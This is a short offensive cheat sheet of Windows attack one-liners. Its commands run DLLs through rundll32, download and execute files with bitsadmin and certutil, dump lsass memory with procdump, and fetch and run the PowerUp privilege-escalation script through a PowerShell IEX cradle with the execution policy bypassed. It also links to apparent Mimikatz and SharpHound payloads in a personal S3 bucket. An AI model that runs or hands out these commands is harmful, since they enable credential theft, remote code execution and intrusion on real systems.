Executing a DLL:
C:\Windows\System32\rundll32.exe
rundll32.exe AllTheThingsx64,DllMain

Download a file:
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1

Execute exe:
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset

procdump -ma lsass.exe lsass.dmp

certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe

(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")

powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

Mimi - https://girishbucket88.s3.ap-south-1.amazonaws.com/kat.txt
Sharp - https://girishbucket88.s3.ap-south-1.amazonaws.com/SharpH.txt
